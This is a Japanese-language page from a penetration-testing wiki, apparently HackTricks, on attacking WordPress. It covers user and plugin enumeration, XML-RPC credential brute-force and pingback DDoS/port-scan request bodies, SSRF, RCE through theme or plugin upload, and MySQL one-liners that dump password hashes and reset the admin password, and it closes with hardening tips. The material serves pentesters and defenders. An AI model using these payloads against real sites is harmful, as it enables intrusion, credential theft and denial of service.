# Wordpress

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化する**。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 基本情報

**アップロードされた**ファイルはこちらにあります：`http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**テーマファイルは/wp-content/themes/にあります。** なので、テーマのphpを変更してRCEを取得する場合は、そのパスを使用することになるでしょう。例えば：**テーマtwentytwelve**を使用して、**404.php**ファイルにアクセスする場合は：[**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**もう一つの役立つURLは：** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

**wp-config.php**にはデータベースのルートパスワードが記載されています。

デフォルトのログインパスをチェックする：_**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **主なWordPressファイル**

* `index.php`
* `license.txt` には、インストールされたWordPressのバージョンなどの有用な情報が含まれています。
* `wp-activate.php` は、新しいWordPressサイトを設定する際のメールアクティベーションプロセスに使用されます。
* ログインフォルダ（隠すために名前が変更されている可能性があります）:
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php` は、HTTPを輸送メカニズムとして、XMLをエンコーディングメカニズムとして使用してデータを送信するWordPressの機能を表すファイルです。このタイプの通信はWordPressの[REST API](https://developer.wordpress.org/rest-api/reference)に置き換えられました。
* `wp-content` フォルダは、プラグインとテーマが保存されている主要なディレクトリです。
* `wp-content/uploads/` は、プラットフォームにアップロードされたファイルが保存されているディレクトリです。
* `wp-includes/` は、証明書、フォント、JavaScriptファイル、ウィジェットなどのコアファイルが保存されているディレクトリです。
* `wp-sitemap.xml` WordPressバージョン5.5以降では、Worpressはすべての公開投稿と公開クエリ可能な投稿タイプおよびタクソノミーを含むサイトマップXMLファイルを生成します。

**ポストエクスプロイト**

* `wp-config.php` ファイルには、WordPressがデータベースに接続するために必要な情報、例えばデータベース名、データベースホスト、ユーザー名とパスワード、認証キーとソルト、データベーステーブルプレフィックスが含まれています。この設定ファイルは、トラブルシューティングに役立つDEBUGモードをアクティブにするためにも使用できます。

### ユーザー権限

* **管理者**
* **編集者**: 自分と他人の投稿を公開し管理する
* **著者**: 自分の投稿を公開し管理する
* **寄稿者**: 投稿を書いて管理するが、公開はできない
* **購読者**: 投稿を閲覧し、自分のプロフィールを編集する

## **パッシブ列挙**

### **WordPressバージョンの取得**

`/license.txt` または `/readme.html` のファイルが見つかるかどうかをチェックしてください

ページの**ソースコード**内でのチェック（[https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)からの例）:

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (343).png>)

* CSSリンクファイル

![](<../../.gitbook/assets/image (344).png>)

* JavaScriptファイル

![](<../../.gitbook/assets/image (346).png>)

### プラグインを取得する

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### テーマの取得

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 一般的なバージョンの抽出

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も高度な**コミュニティツールを駆使した**ワークフローの自動化**を簡単に構築できます。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## アクティブ列挙

### プラグインとテーマ

すべてのプラグインとテーマを見つけることはできないかもしれません。それらをすべて発見するためには、**プラグインとテーマのリストを積極的にブルートフォース**する必要があります（幸いなことに、これらのリストを含む自動化ツールがあります）。

### ユーザー

**ID ブルート**

WordPressサイトから有効なユーザーを取得するには、ユーザーIDをブルートフォースします：
```
curl -s -I -X GET http://blog.example.com/?author=1
```
```markdown
レスポンスが **200** または **30X** であれば、そのIDは**有効**です。レスポンスが **400** であれば、そのIDは**無効**です。

**wp-json**

ユーザーに関する情報を取得するために、以下のクエリを試すこともできます:
```
```
curl http://blog.example.com/wp-json/wp/v2/users
```
```
別のユーザーに関する情報を明らかにすることができる `/wp-json/` エンドポイントは以下の通りです:
```
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
このエンドポイントは投稿を行ったユーザーのみを公開します。**この機能を有効にしているユーザーに関する情報のみが提供されます**。

また、**/wp-json/wp/v2/pages** がIPアドレスを漏洩する可能性があることにも注意してください。

#### ログインユーザー名の列挙

**`/wp-login.php`** でログインする際、指定された**ユーザー名が存在するかどうか**によって**メッセージが異なります**。

### XML-RPC

`xml-rpc.php`がアクティブな場合、資格情報のブルートフォースを実行したり、他のリソースに対してDoS攻撃を起動することができます。(例えば、[これを使用して](https://github.com/relarizky/wpxploit)このプロセスを自動化できます)。

それがアクティブかどうかを確認するには、_**/xmlrpc.php**_ にアクセスして、このリクエストを送信してください：

**チェック**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
**資格情報のブルートフォース**

**`wp.getUserBlogs`**, **`wp.getCategories`** や **`metaWeblog.getUsersBlogs`** は、資格情報をブルートフォースするために使用できるメソッドの一部です。これらのいずれかを見つけた場合、次のようなリクエストを送信できます：
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
認証情報が無効である場合、200コードレスポンス内に_"Incorrect username or password"_というメッセージが表示されるべきです。

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (4).png>)

![](<../../.gitbook/assets/image (102).png>)

正しい認証情報を使用してファイルをアップロードできます。レスポンスにはパスが表示されます（[https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982)）。
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
以下は、同じリクエストで複数の資格情報を試すことができるため、資格情報をブルートフォースする**より速い方法**です。**`system.multicall`** を使用します：

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

**2FAをバイパスする**

この方法はプログラム用であり、人間用ではなく、古いため、2FAをサポートしていません。有効な資格情報を持っているが、メインの入り口が2FAで保護されている場合、**xmlrpc.phpを悪用して、2FAをバイパスしてそれらの資格情報でログインすることができるかもしれません**。コンソールを通じて実行できるすべてのアクションを実行できないかもしれませんが、Ippsecが[https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)で説明しているように、RCEに到達することができるかもしれません。

**DDoSまたはポートスキャン**

リスト内に _**pingback.ping**_ メソッドを見つけることができれば、Wordpressに任意のホスト/ポートへのリクエストを送信させることができます。
これは、**何千もの** Wordpress **サイト**に一つの**場所**に**アクセス**するように依頼する（その場所で**DDoS**が発生する）ために使用したり、Wordpressに内部**ネットワーク**を**スキャン**させるために使用することができます（任意のポートを指定できます）。
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode** が **0** より**大きい**値（17）で返ってきた場合、ポートが開いていることを意味します。

DDoSを引き起こすためにこの方法を悪用する方法を学ぶには、前のセクションの **`system.multicall`** の使用法を確認してください。

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
### wp-cron.php DoS

このファイルは通常、Wordpressサイトのルート下に存在します：**`/wp-cron.php`**\
このファイルが**アクセスされる**と、"**重い**" MySQL **クエリ**が実行されるため、**攻撃者**によって**DoS**を**引き起こす**可能性があります。\
また、デフォルトでは、`wp-cron.php`はページの読み込みごとに呼び出されます（クライアントがWordpressページをリクエストするたびに）、これは高トラフィックのサイトでは問題を引き起こす可能性があります（DoS）。

Wp-Cronを無効にし、ホスト内に実際のcronjobを作成して、定期的に必要なアクションを実行すること（問題を引き起こさないように）が推奨されます。

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ にアクセスしてみてください。Worpressサイトがあなたにリクエストを送信する可能性があります。

これはうまくいかないときのレスポンスです：

![](<../../.gitbook/assets/image (184) (1).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

このツールは、**methodName: pingback.ping** とパス **/wp-json/oembed/1.0/proxy** をチェックし、存在する場合はそれらを利用しようとします。

### 自動ツール
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールを駆使した**ワークフローの自動化**を簡単に構築できます。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ビットを上書きしてアクセスを得る

これは実際の攻撃というよりは興味深い事例です。CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)では、任意のWordPressファイルの1ビットを変更できました。そのため、ファイル`/var/www/html/wp-includes/user.php`の位置`5389`のビットをフリップして、NOT（`!`）操作をNOPにすることができました。
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**使用中のテーマのphpを変更する（管理者の資格情報が必要です）**

外観 → テーマエディター → 右側の404テンプレート

phpシェルの内容に変更する：

![](<../../.gitbook/assets/image (21) (1) (1).png>)

インターネットで、更新されたページにどのようにアクセスするかを検索してください。この場合、ここにアクセスする必要があります： [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

使用できます：
```
use exploit/unix/webapp/wp_admin_shell_upload
```
セッションを取得するために。

## プラグイン RCE

### PHPプラグイン

プラグインとして.phpファイルをアップロードできる可能性があります。\
例えば以下を使用してphpバックドアを作成します：

![](<../../.gitbook/assets/image (407).png>)

次に新しいプラグインを追加します：

![](<../../.gitbook/assets/image (409).png>)

プラグインをアップロードして「今すぐインストール」を押します：

![](<../../.gitbook/assets/image (411).png>)

「進む」をクリックします：

![](<../../.gitbook/assets/image (412).png>)

おそらくこれは表面上は何も起こらないでしょうが、メディアに行くとアップロードされたシェルが見えます：

![](<../../.gitbook/assets/image (413).png>)

アクセスすると、リバースシェルを実行するためのURLが表示されます：

![](<../../.gitbook/assets/image (414).png>)

### 悪意のあるプラグインのアップロードと有効化

**(この部分は** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/) **からコピーされています)**

時にはログオンユーザーはWordPressのテーマを変更する書き込み権限を持っていないため、「WPプラグインの悪意のある注入」をウェブシェルを取得する代替戦略として選択します。

したがって、WordPressのダッシュボードにアクセスできるようになったら、悪意のあるプラグインをインストールすることを試みることができます。ここでは、すでにexploit dbから脆弱なプラグインをダウンロードしています。

練習用のプラグインをダウンロードするには[**ここ**](https://www.exploit-db.com/exploits/36374)をクリックしてください。

![](https://i1.wp.com/1.bp.blogspot.com/-Y\_Aw7zSFJZs/XY9pymSjdvI/AAAAAAAAguY/FGyGEzlx9VIqNYyyra9r55IklNmwXwMQwCLcBGAsYHQ/s1600/10.png?w=687\&ssl=1)

プラグインのzipファイルを持っているので、今がプラグインをアップロードする時です。

ダッシュボード > プラグイン > プラグインをアップロード

![](https://i0.wp.com/1.bp.blogspot.com/-FLhqB0I32Mg/XY9pyrlKWAI/AAAAAAAAguU/tofpIetTCv4Mho5y5D\_sDuuokC7mDmKowCLcBGAsYHQ/s1600/11.png?w=687\&ssl=1)

示されているようにダウンロードしたzipファイルを参照します。

![](https://i2.wp.com/1.bp.blogspot.com/-KMumiwE2Tf0/XY9pzznEI4I/AAAAAAAAguk/BavBJP6plFo8NIpa38oWEKfx0jkOXv3HgCLcBGAsYHQ/s1600/12.png?w=687\&ssl=1)

パッケージが正常にインストールされたら、プラグインを有効化する必要があります。

![](https://i2.wp.com/1.bp.blogspot.com/-YrFg94Y2EZs/XY9pzydfLDI/AAAAAAAAgug/AjZyQ6Na8kUUmquJXwoapxcmr2-8nAMwQCLcBGAsYHQ/s1600/13.png?w=687\&ssl=1)

すべてがうまく設定されたら、エクスプロイトを試みます。私たちは「reflex-gallery」という脆弱なプラグインをインストールしましたが、これは簡単にエクスプロイト可能です。

この脆弱性のエクスプロイトはMetasploitフレームワーク内にあり、以下のモジュールをロードして次のコマンドを実行します：

上記のコマンドが実行されると、meterpreterセッションを持つことになります。この記事で描かれているように、WordPressプラットフォームのウェブサイトをエクスプロイトするための複数の方法があります。

![](https://i1.wp.com/1.bp.blogspot.com/-s6Yblqj-zQ8/XY9pz0qYWAI/AAAAAAAAguo/WXgEBKIB64Ian\_RQWaltbEtdzCNpexKOwCLcBGAsYHQ/s1600/14.png?w=687\&ssl=1)

## 侵害後の対応

ユーザー名とパスワードを抽出：
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
管理者パスワードの変更：
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## WordPress 保護

### 定期的な更新

WordPress、プラグイン、およびテーマが最新であることを確認してください。また、wp-config.php で自動更新が有効になっていることを確認してください：
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
```
**信頼できるWordPressプラグインとテーマのみをインストールしてください。**

### セキュリティプラグイン

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **その他の推奨事項**

* デフォルトの**admin**ユーザーを削除する
* **強力なパスワード**と**2FA**を使用する
* 定期的にユーザーの**権限**を**確認**する
* ブルートフォース攻撃を防ぐために**ログイン試行回数を制限**する
* **`wp-admin.php`** ファイルの名前を変更し、内部または特定のIPアドレスからのみアクセスを許可する。

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
世界で**最も進んだ**コミュニティツールを駆使して、簡単に**ワークフローを構築し自動化**するために[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用してください。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
```
